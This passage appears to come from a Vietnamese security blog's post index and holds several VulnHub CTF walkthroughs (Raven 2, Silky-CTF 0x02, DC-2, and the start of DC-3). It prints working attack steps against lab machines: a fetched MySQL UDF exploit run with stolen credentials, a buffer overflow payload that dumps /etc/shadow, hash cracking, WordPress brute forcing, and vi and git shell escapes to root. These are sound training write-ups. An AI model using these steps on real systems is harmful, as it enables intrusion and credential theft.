(Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)    S·ª≠ d·ª•ng wpscan brute force ƒë∆∞·ª£c m·∫≠t kh·∫©u c·ªßa steven l√† LOLLOL1. Nh∆∞ng th√¥i, ƒë·∫øn ƒë√¢y ƒë√£, quay l·∫°i c√°i remote shell kia th√¥i :D. (Th·ª±c ra m√¨nh l·∫•y ƒë∆∞·ª£c m·∫≠t kh·∫©u, ƒëang sung s∆∞·ªõng ssh ƒë·∫øn th·∫±ng steven nh∆∞ng ƒë·∫øu ƒë∆∞·ª£c :() 1 2 3 4 5 6  www-data@Raven:/var/www$ ps uax | grep mysql ps uax | grep mysql root 543 0.0 0.1 4340 1608 ? S Jun20 0:00 /bin/sh /usr/bin/mysqld_safe root 909 0.0 5.1 816988 52956 ? Sl Jun20 0:08 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 www-data 1783 0.0 0.0 11136 984 pts/4 S+ 01:26 0:00 grep mysql www-data@Raven:/var/www$    Th·∫•y ƒë∆∞·ª£c l√† mysql ƒëang ch·∫°y ·ªü quy·ªÅn root. Th·ª≠ t√¨m ki·∫øm m·∫•y c√°i exploit th√¨ ki·∫øm ƒë∆∞·ª£c c√°i n√†y https://www.exploit-db.com/exploits/46249 wget https://www.exploit-db.com/download/46249 s·ª≠ d·ª•ng c√¢u l·ªánh n√†y t·∫£i exploit n√†y v·ªÅ r·ªìi ƒë·ªïi t√™n th√†nh 46249.py   √Ä n√≥ y√™u c·∫ßu username v√† password c·ªßa mysql, trong th·∫±ng wordpress n√†y c√≥ file wp-config.php ·ªü th∆∞ m·ª•c /wordpress/. V√†o ƒë·ªçc th√¨ bi·∫øt ƒë∆∞·ª£c username:password l√† root:R@v3nSecurity. C√≥ ƒë·ªß th·ª© m√¨nh c·∫ßn r·ªìi. Ch·∫°y th·ª≠ c√°i coi sao. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  www-data@Raven:/var/www/html$ python 46249.py --username root --password R@v3nSecurity \u0026lt;l$ python 46249.py --username root --password R@v3nSecurity Plugin dir is /usr/lib/mysql/plugin/ Trying to create a udf library... UDF library crated successfully: /usr/lib/mysql/plugin/udf9609.so Trying to create sys_exec... ERROR 1125 (HY000) at line 1: Function \u0026#39;sys_exec\u0026#39; already exists Checking if sys_exec was crated... sys_exec was found: *************************** 1. row *************************** name: sys_exec ret: 2 dl: udf5766.so type: function Generating a suid binary in /tmp/sh... +-------------------------------------------------------------------------+ | sys_exec(\u0026#39;cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\u0026#39;) | +-------------------------------------------------------------------------+ | 0 | +-------------------------------------------------------------------------+ Trying to spawn a root shell... #    1 2 3 4  # whoami whoami root #     ·∫§y ch√† ch√†, c√≥ root r·ªìi, v√†o /root l·∫•y n·ªët c√°i flag cu·ªëi th√¥i :3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # cd /root cd /root # ls ls flag4.txt # cat flag4.txt cat flag4.txt ___ ___ ___ | _ \\__ ___ _____ _ _ |_ _|_ _| | / _` \\ V / -_) \u0026#39; \\ | | | | |_|_\\__,_|\\_/\\___|_||_|___|___| flag4{df2bc5e951d91581467bb9a2a8ff4425} CONGRATULATIONS on successfully rooting RavenII I hope you enjoyed this second interation of the Raven VM Hit me up on Twitter and let me know what you thought: @mccannwj / wjmccann.github.io #      T·ªïng k·∫øt  B√†i n√†y kh√° l√† th√∫ v·ªã, n√≥ ch·∫°y nhi·ªÅu th·ª© tr√™n con web n√†y, ph·∫ßn c≈©ng ƒë·ªÉ ƒë√°nh l·ª´a, ph·∫ßn c≈©ng ƒë·ªÉ m√¨nh m·∫•t th·ªùi gian h∆°n. Nh∆∞ng ƒë√¢y l√† m·ªôt tr·∫£i nghi·ªám kh√° th√∫ v·ªã :D. Ch√∫c c√°c b·∫°n th√†nh c√¥ng :v C·∫£m ∆°n anh @vigov5 ƒë√£ c∆∞·ªõp gi√∫p em qu·∫£ flag cu·ªëi =))  ","permalink":"https://minhtuanact.ml/posts/vulnhub-ctf-raven-2-walkthrough-van-la-chiem-quyen-root-lan-nay-la-mysql/","summary":"M·ªü ƒë·∫ßu  D·∫°o n√†y m√¨nh r·∫•t c√≥ h·ª©ng th√∫ v·ªõi m·∫•y b√†i lab tr√™n VulnHub.com. L·∫ßn n√†y l·∫°i l√† m·ªôt b√†i n·ªØa, c√≥ th·ªÉ ch·ªçc ngo√°y kh√° nhi·ªÅu v·∫•n ƒë·ªÅ ·ªü b√†i n√†y. B·∫°n n√†o mu·ªën build l√™n l√†m th·ª≠ th√¨ qua link n√†y Raven: 2 Th√¥i th√¨ b·∫Øt ƒë·∫ßu v√†o chi·∫øn th√¥i. B√†i n√†y c√≥ t·∫•t c·∫£ l√† 4 c·ªù. M√¨nh ƒëi theo h∆∞·ªõng t√¨m l·∫ßn l∆∞·ª£t 4 c·ªù lu√¥n nh√©.","title":"VulnHub CTF - Raven 2 Walkthrough - V·∫´n l√† chi·∫øm quy·ªÅn root, l·∫ßn n√†y l√† Mysql"},{"content":"M·ªü ƒë·∫ßu  L·∫°i l√† m√¨nh ƒë√¢y, v·∫´n l√† c√°i serie v√†o /root ƒë·ªÉ l·∫•y c·ªù :joy_cat::joy_cat::joy_cat:. V·∫´n l√† m·∫•y b√†i lab tr√™n VulnHub.com. L·∫ßn n√†y s·∫Ω l√† m·ªôt b√†i kh√° ƒë∆°n gi·∫£n v·ªÅ l·ªói Buffer OverFlow. Silky-CTF: 0x02, Link b√†i lab, c√°c b·∫°n c√≥ th·ªÉ t·∫£i v·ªÅ v√† build n√≥ l√™n r·ªìi l√†m th·ª≠ nh√©. N·∫øu m√† ch∆∞a l√†m ƒë∆∞·ª£c hay b√≠ b√°ch ch·ªó n√†o th√¨ k√©o xu·ªëng d∆∞·ªõi n√®. M√¨nh hint cho :D  T·∫•n c√¥ng  V·∫´n nh∆∞ th∆∞·ªùng l·ªá, build lab l√™n r·ªìi ph·∫£i d√≤ IP c·ªßa b√†i lab b·∫±ng nmap th√¥i. Qu√©t ra ƒë·ªãa ch·ªâ 192.168.19.107 r·ªìi. V√†o trang th√¨ th·∫•y nh∆∞ n√†y.   S·ª≠ d·ª•ng dirb qu√©t th·ª≠ xem trang c√≥ g√¨ kh√¥ng.   C√≥ trang /admin.php, v√†o th√¥i.   Th·ª≠ login v·ªõi Username = admin \u0026amp;\u0026amp; Password = admin URl:http://192.168.19.107/admin.php?username=admin\u0026amp;password=admin. ·ªí, trang web s·ª≠ d·ª•ng ph∆∞∆°ng th·ª©c GET ƒë·ªÉ l·∫•y user v√† pass. Sau khi th·ª≠ m·ªôt h·ªìi c√°c l·ªói c∆° b·∫£n th√¨ ph√°t hi·ªán ra web n√†y d√≠nh l·ªói Commandline Injection, th·ª≠ truy·ªÅn ls v√†o √¥ username ta ƒë∆∞·ª£c h√¨nh b√™n d∆∞·ªõi   Th·ª±c hi·ªán Remote Shell qua th√¥i, ƒë·∫ßu ti√™n ·ªü m√°y m√¨nh g√µ l·ªánh nc -lvp 5000 ƒë·ªÉ l·∫Øng nghe t·∫•t c·∫£ c·ªïng 5000 truy·ªÅn ƒë·∫øn. ·ªû b√™n m√°y victim th√¨ truy·ªÅn v√†o nh∆∞ sau   Ok r·ªìi, ta ƒë√£ remote ƒë∆∞·ª£c, sau m·ªôt h·ªìi xem x√©t, b·ªã v√†i c√∫ l·ª´a th√¨ c≈©ng l·∫•y ƒë∆∞·ª£c 1 em flag ·ªü/home/silky    Trong folder n√†y th·∫•y m·ªôt file cat_shadow n·ªØa, t·∫£i v·ªÅ m√°y m√¨nh xem. Run l√™n th√¨ ƒë∆∞·ª£c nh∆∞ v·∫ßy.\n1 2 3  root@kali:~# ./cat_shadow cat_shadow: Usage: cat_shadow \u0026lt;Password\u0026gt;     Humm, th·ª≠ truy·ªÅn v√†i th·ª© v√†o xem.\n1 2 3 4  root@kali:~# ./cat_shadow AAAA Trying to cat /etc/shadow Permisson denied! 0x00000000 != 0x496c5962     H√¨nh nh∆∞ c√°i l·ªói Buffer OverFlow, truy·ªÅn nhi·ªÅu nhi·ªÅu m·ªôt ch√∫t xem n√†o\n1 2 3 4  root@kali:~# ./cat_shadow $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*30)\u0026#34;) Trying to cat /etc/shadow Permisson denied! 0x00000000 != 0x496c5962     Ch∆∞a ƒë∆∞·ª£c, nhi·ªÅu n·ªØa xem th·∫ø n√†o.\n1 2 3 4  root@kali:~# ./cat_shadow $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*70)\u0026#34;) Trying to cat /etc/shadow Permisson denied! 0x41414141 != 0x496c5962     ƒÇn r·ªìi, sau m·ªôt h·ªìi th·ª≠ th√¨ n√≥ b·ªã d√≠nh ·ªü 64, m√¨nh truy·ªÅn c√°i chu·ªói n√≥ y√™u c·∫ßu v√†o th√¥i\n1 2 3 4 5  root@kali:~# ./cat_shadow $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;\\x62\\x59\\x6c\\x49\u0026#39;)\u0026#34;) Trying to read /etc/shadow Succes Printing... root:$6$qvhlqI7I$//0whlOY9i55tzFatxkzafR7n7KA2P2nRh7kMSo82KrGV89ujtSTPEJOQjXsRGpSEFuFKnCT0a0.g92kCstOP1:17938:0:99999:7:::     Nh∆∞ng ƒë√¢y l√† ƒëang ƒÉn ·ªü b√™n m√°y m√¨nh, ph·∫£i run ·ªü tr√™n m√°y c·ªßa victim ch·ªõ.\n1 2 3 4 5 6 7  www-data@Silky-CTF0x02:/home/silky$ ./cat_shadow $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;\\x62\\x59\\x6c\\x49\u0026#39;)\u0026#34;) \u0026lt;dow $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;\\x62\\x59\\x6c\\x49\u0026#39;)\u0026#34;) Trying to read /etc/shadow Succes Printing... root:$6$L69RL59x$ONQl06MP37LfjyFBGlQ5TYtdDqEZEe0yIZIuTHASQG/dgH3Te0fJII/Wtdbu0PA3D/RTxJURc.Ses60j0GFyF/:18012:0:99999:7::: silky:$6$F0T5vQMg$BKnwGPZ17UHvqZLOVFVCUh6CrsZ5Eu8BLT1/uX3h44wtEoDt9qA2dYL04CMUXHw2Km9H.tttNiyaCHwQQ..2T0:18012:0:99999:7:::   (Sorry n√≥ d√†i qu√° m√¨nh c·∫Øt b·ªõt l·∫•y m·∫•y th·ª© quan tr·ªçng th√¥i)\n  Silky th√¨ m√¨nh c√≥ r·ªìi, gi·ªù l·∫•y quy·ªÅn root th√¥i. S·ª≠ d·ª•ng c√¥ng c·ª• John c√≥ trong Kali ƒë·ªÉ Brute Force m·∫≠t kh·∫©u.\n1 2 3 4 5 6 7 8 9 10  root@kali:~# john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status greygrey (root) 1g 0:00:02:28 DONE (2019-06-18 09:22) 0.006716g/s 2070p/s 2070c/s 2070C/s guners..googleplex Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed     V·∫≠y ta l·∫•y ƒë∆∞·ª£c m·∫≠t kh·∫©u root r·ªìi, l√† greygrey, switch sang t√†i kho·∫£n root r·ªìi ch·ª•p c·ªù cu·ªëi th√¥i.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@Silky-CTF0x02:/# cd /root cd /root root@Silky-CTF0x02:~# ls ls flag.txt root@Silky-CTF0x02:~# cat flag.txt cat flag.txt ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ïö‚ñà‚ñà‚ïî‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù ‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù Fun Fact: Um ein Kilogramm Rohseide zu gewinnen, werden bis zu zehn Kilogramm Kokons ben√∂tigt. Gl√ºckwunsch :) Flag:d1f258a6ec26dffbbdec79f68890a5e8     T·ªïng k·∫øt  M·ªôt b√†i CTF ƒë∆°n gi·∫£n v·ªÅ web v√† buffer overflow cho c√°c b·∫°n th·ª≠. Goodluck :D  ","permalink":"https://minhtuanact.ml/posts/vulnhub-ctf-silky-ctf-0x02-loi-buffer-overflow/","summary":"M·ªü ƒë·∫ßu  L·∫°i l√† m√¨nh ƒë√¢y, v·∫´n l√† c√°i serie v√†o /root ƒë·ªÉ l·∫•y c·ªù :joy_cat::joy_cat::joy_cat:. V·∫´n l√† m·∫•y b√†i lab tr√™n VulnHub.com. L·∫ßn n√†y s·∫Ω l√† m·ªôt b√†i kh√° ƒë∆°n gi·∫£n v·ªÅ l·ªói Buffer OverFlow. Silky-CTF: 0x02, Link b√†i lab, c√°c b·∫°n c√≥ th·ªÉ t·∫£i v·ªÅ v√† build n√≥ l√™n r·ªìi l√†m th·ª≠ nh√©. N·∫øu m√† ch∆∞a l√†m ƒë∆∞·ª£c hay b√≠ b√°ch ch·ªó n√†o th√¨ k√©o xu·ªëng d∆∞·ªõi n√®.","title":"VulnHub CTF - Silky-CTF: 0x02 - L·ªói Buffer OverFlow"},{"content":"M·ªü ƒë·∫ßu  Ti·∫øp t·ª•c l√† m√¨nh ƒë√¢y, sau khi vi·∫øt xong b√†i DC-3 Walkthrough - Cu·ªôc phi√™u l∆∞u k·ª≥ th√∫ th√¨ m√¨nh l·∫°i build l√™n lab n·ªØa cho nh√≥m th·ª≠ s·ª©c xem sao. C·ª• th·ªÉ l√† lab DC-2. B√†i n√†y c√≥ t·∫•t c·∫£ l√† 5 c·ªù, t√≠nh c·∫£ c·ªù cu·ªëi. Ch√∫ng ta ph·∫£i t√¨m ƒë·ªß 5 c·ªù ƒë√≥ m·ªõi ho√†n th√†nh b√†i lab n√†y. M·ªçi ng∆∞·ªùi theo m√¨nh nh√©.  T·∫•n c√¥ng   V·∫´n nh∆∞ c√°c b√†i kh√°c, ƒë·∫ßu ti√™n m√¨nh ph·∫£i d√πng nmap qu√©t t·∫•t c·∫£ c√°c IP trong d·∫£i m·∫°ng c·ªßa m√¨nh ƒë·ªÉ t√¨m ra IP c·ªßa lab.\n  Sau khi x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë·ªãa ch·ªâ IP r·ªìi, ti·∫øp t·ª•c c·∫ßn x√°c ƒë·ªãnh xem h·ªá ƒëi·ªÅu h√†nh, qu√©t c√°c t·∫≠p l·ªánh, \u0026hellip; b·∫±ng l·ªánh -A trong nmap\n  Do ƒë√¢y l√† 1 CMS n√™n m√¨nh ph·∫£i n√©m n√≥ v√†o hosts th√¨ m·ªõi ch·∫°y l√™n ƒë∆∞·ª£c. M·ªü file hosts l√™n v√†o th√™m d√≤ng 192.168.19.62 dc-2 v√†o. M·ªü tr√¨nh duy·ªát ch·∫°y http://dc-2 ta ƒë∆∞·ª£c 1 con web nh∆∞ n√†y.\n  Theo th√≥i quen, x√°c ƒë·ªãnh con n√†y ch·∫°y b·∫±ng c√°i g√¨ ƒë√£, m·ªü Wappalyzer l√™n th√¨ bi·∫øt con web n√†y ch·∫°y b·∫±ng WordPress.\n  C√≥ flag k√¨a, b·∫•m v√†o coi sao. ƒê√¢y l√† m·ªôt hint c·ªßa b√†i th√¥i.\n  N√≥ c√≥ nh·∫Øc ƒë·∫øn cewl, ƒë√¢y l√† 1 tool tr√™n kali t·∫°o list m·∫≠t kh·∫©u th√¥i. Ch·∫Øc l√† s·ª≠ d·ª•ng c√°i n√†y, ch·∫°y n√≥ l√™n th√¥i :D.\n1  cewl -w crack.txt http://dc-2     Do con web n√†y ch·∫°y b·∫±ng WordPress n√™n s·ª≠ d·ª•ng WPScan tr√™n Kali lu√¥n.\n1  wpscan --url http://dc-2 --passwords crack.txt     Ui con web n√†y l·∫Øm l·ªói qu√°, b·∫Øn ra m·ªôt ƒë·ªëng CVE v·ªõi c√°i phi√™n b·∫£n c·ªßa n√≥. ƒêi·ªÅu ch√∫ng ta quan t√¢m l√† ƒë√¢y n√® :D\n  B·∫Øt ƒë∆∞·ª£c 1 con m√®o v√† 1 con chu·ªôt\n1 2  | Username: jerry, Password: adipiscing | Username: tom, Password: parturient     C√≥ user v√† pass r·ªìi, ƒëƒÉng nh·∫≠p v√†o th√¥i. V√†o http://dc-2/wp-admin/ ƒëƒÉng nh·∫≠p t√†i kho·∫£n jerry xem c√≥ g√¨ k.\n  Loay hoay m·ªôt h·ªìi th√¨ th·∫•y c√°i flag 2 ƒë∆∞·ª£c ƒë·ªÉ trong Pages. N·ªôi dung th√¨ l√† nh∆∞ n√†y.\n  C√≥ m·ªôt c√°ch kh√°c nhanh h∆°n √† (suynghi). L·∫ßn m√≤ l·∫ßn m√≤ m√£i, xong qu√©t th·ª≠ full port xem c√≥ c√°i g√¨ ƒëang m·ªü k.\n  C·ªïng 7744 ssh ƒëang m·ªü k√¨a (ngacnhien). :laughing::laughing:. SSH t·ªõi th√¥i ch·ª© c√≤n l√†m g√¨ n·ªØa.\n  ssh jerry@192.168.19.62 -p 7744 r·ªìi nh·∫≠p m·∫≠t kh·∫©u c·ªßa jerry v√¥. Kh√¥ng ƒë∆∞·ª£c, ch·∫≥ng l·∫Ω nh·∫≠p sai ·ªü ƒë√¢u. Th·ª≠ v·ªõi th·∫±ng tom xem sao. ƒê∆∞·ª£c lu√¥n n√†y.\n  V√†o ƒë∆∞·ª£c th·∫±ng tom, ls ph√°t th√¨ th·∫•y flag3.txt. N·ªôi dung th√¨ l√† nh∆∞ n√†y\n1  Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.     Ngh·ªãch ng·ª£m m·ªôt l√∫c th√¨ th·∫•y th·∫±ng tom n√†y c√≥ m·ªói m·∫•y c√°i quy·ªÅn n√†y th√¥i\n1 2  tom@DC-2:~$ ls /home/tom/usr/bin less ls scp vi     Export ph√°t xem th·∫ø n√†o. Gi·ªù ph·∫£i s·ª≠a ƒë∆∞·ª£c th·∫±ng PATH ƒë·ªÉ l·∫•y th√™m quy·ªÅn, ch·ª© b·∫±ng kia kh√¥ng ƒë·ªß.\n  Nh·ªõ ·ªü ƒë√¢u m√¨nh ƒë·ªçc ƒë∆∞·ª£c th·∫±ng vi c√≥ th·ªÉ up shell l√™n ƒë∆∞·ª£c, v√†o th·∫±ng vi set ph√°t xem n√†o.\n1 2 3  vi :set shell=/bin/bash :shell     √Å ngon, ch·∫°y n√†y. cd ph√°t xem c√≥ tr·∫ßm tr·ªì kh√¥ng n√†o.\n1  tom@DC-2:/home$ export PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;     S·ª≠a th·∫±ng PATH c√°i ƒë√£ ƒë·ªÉ l·∫•y th√™m l·ªánh =))\n  ƒê∆∞·ª£c r·ªìi. ·∫§m r·ªìi, c∆° m√† loay hoay m·ªôt h·ªìi c≈©ng ch·∫£ bi·∫øt l√†m g√¨, switch th·ª≠ sang th·∫±ng jerry xem ƒë∆∞·ª£c k.\n  Ngon, v√†o ƒë∆∞·ª£c th·∫±ng jerry r·ªìi. ƒê·ªçc ƒë∆∞·ª£c flag4.txt. Hint ti·∫øp ƒë√¢y r·ªìi, ƒë·ªçc xem c√≥ g√¨ n√†o.\n1 2 3 4 5 6 7  Good to see that you\u0026#39;ve made it this far - but you\u0026#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you\u0026#39;re on your own now. :-) Go on - git outta here!!!!     C√≤n c√°i c·ªù final th√¥i :D\n  C√≥ 1 ch∆∞∆°ng tr√¨nh ƒëang ch·∫°y quy·ªÅn root m√† k c·∫ßn m·∫≠t kh·∫©u root l√† th·∫±ng git.\n  Loay hoay ch√°n ch√™ ch·∫≥ng bi·∫øt khai th√°c th·∫±ng n√†y ki·ªÉu g√¨ ƒë·ªÉ l·∫•y quy·ªÅn root :sob::sob::sob::sob:.\n  Bing boong, l·∫•y ƒë∆∞·ª£c quy·ªÅn root r·ªìi. ƒê·ªçc help c·ªßa git th√¨ c√≥ 1 c√°i g·ªçi l√† ph√¢n trang -p. Khi m√† m√¨nh g√µ sudo git -p --help th√¨ n√≥ s·∫Ω ƒë·ªçc theo trang. Do c√°i help n√≥ d√†i n√™n ƒë·ªçc k h·∫øt trong 1 khung c·ªßa terminal. L·ª£i d·ª•ng ƒëi·ªÉm y·∫øu ƒë√≥, m√¨nh g√µ !/bin/bash v√†o v√† l·∫•y ƒë∆∞·ª£c quy·ªÅn root th√¥i :D\n  T·ªïng k·∫øt  B√†i x√†m x√†m c·ªßa m√¨nh k·∫øt th√∫c ·ªü ƒë√¢y, m√¨nh c≈©ng h·ªçc ƒë∆∞·ª£c r·∫•t nhi·ªÅu ƒëi·ªÅu t·ª´ b√†i lab n√†y. Mong c√°c b·∫°n ƒë·ªçc c√≥ g√¨ c·∫ßn g√≥p √Ω cho m√¨nh ho·∫∑c b·∫°n n√†o c√≥ c√°ch l√†m kh√°c h∆°n c√≥ th·ªÉ comment b√™n d∆∞·ªõi gi√∫p m√¨nh ƒë·ªÉ m√¨nh ph√°t tri·ªÉn h∆°n. C·∫£m ∆°n t·∫•t c·∫£ c√°c b·∫°n ƒë√£ ƒë·ªçc b√†i n√†y c·ªßa m√¨nh :D  ","permalink":"https://minhtuanact.ml/posts/vulnhub-ctf-dc-2-cuop-5-flags-va-cai-ket/","summary":"M·ªü ƒë·∫ßu  Ti·∫øp t·ª•c l√† m√¨nh ƒë√¢y, sau khi vi·∫øt xong b√†i DC-3 Walkthrough - Cu·ªôc phi√™u l∆∞u k·ª≥ th√∫ th√¨ m√¨nh l·∫°i build l√™n lab n·ªØa cho nh√≥m th·ª≠ s·ª©c xem sao. C·ª• th·ªÉ l√† lab DC-2. B√†i n√†y c√≥ t·∫•t c·∫£ l√† 5 c·ªù, t√≠nh c·∫£ c·ªù cu·ªëi. Ch√∫ng ta ph·∫£i t√¨m ƒë·ªß 5 c·ªù ƒë√≥ m·ªõi ho√†n th√†nh b√†i lab n√†y. M·ªçi ng∆∞·ªùi theo m√¨nh nh√©.  T·∫•n c√¥ng   V·∫´n nh∆∞ c√°c b√†i kh√°c, ƒë·∫ßu ti√™n m√¨nh ph·∫£i d√πng nmap qu√©t t·∫•t c·∫£ c√°c IP trong d·∫£i m·∫°ng c·ªßa m√¨nh ƒë·ªÉ t√¨m ra IP c·ªßa lab.","title":"VulnHub CTF - DC-2 - C∆∞·ªõp 5 flags v√† c√°i k·∫øt"},{"content":"M·ªü ƒë·∫ßu  V√†o m·ªôt ng√†y tr·ªùi k ƒë∆∞·ª£c ƒë·∫πp cho l·∫Øm, n·∫Øng kh√° g·∫Øt, captain c√≥ n√©m cho ch√∫ng t√¥i 1 ƒë∆∞·ªùng link v·ªÅ m·∫•y b√†i lab tr√™n VulnHub. V√† ƒë√¢y l√† m·ªôt trong m·ªôt s·ªë b√†i m√† ch√∫ng t√¥i l√†m ƒë∆∞·ª£c. C√°c b√†i kia r·ªìi c≈©ng s·∫Ω c√≥ b√†i vi·∫øt nhanh th√¥i :D. T√¥i c√≥ nhi·ªám v·ª• build con m√°y n√†y l√™n, c≈©ng kh√¥ng c√≥ kh√≥ khƒÉn g√¨ l·∫Øm. M·ªü Virtual Box ch·ªçn card m·∫°ng bridge ƒë·ªÉ cho anh em v√†o ƒë∆∞·ª£c r·ªìi run n√≥ l√™n th√¥i. Link con lab ·∫•y ƒë√¢y, b·∫°n n√†o mu·ªën ngh·ªãch th√¨ v√†o ƒë√¢y nha DC-3  T·∫•n c√¥ng   Trong m√¥ t·∫£ c·ªßa lab DC-3 c≈©ng ƒë√£ n√≥i. N√≥ s·∫Ω cho ta 1 con web v√† b·∫Øt ch√∫ng ta ph·∫£i chi·∫øm ƒë∆∞·ª£c quy·ªÅn root v√† l·∫•y c·ªù t·ª´ ƒë√≥.\n  ƒê·∫ßu ti√™n ph·∫£i qu√©t ƒë∆∞·ª£c ip c·ªßa con lab ƒëang ·ªü ƒë√¢u ƒë√£. S·ª≠ d·ª•ng l·ªánh nmap -sP 192.168.19.0/24 (d·∫£i ƒë·ªãa ch·ªâ t√πy theo m·∫°ng n·ªôi b·ªô c·ªßa b·∫°n)\n1 2 3  Nmap scan report for 192.168.19.106 Host is up (0.00050s latency). MAC Address: 08:00:27:1C:53:6A (Oracle VirtualBox virtual NIC)     ·ªû ƒë√¢y t√¥i ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë·ªãa ch·ªâ ip c·ªßa con m√°y kia r·ªìi, v√†o th√¥i.   Giao di·ªán con web c≈©ng ch·∫≥ng c√≥ g√¨, ph√°t hi·ªán ƒë∆∞·ª£c trang login, r·ªìi trang qu·∫£n tr·ªã 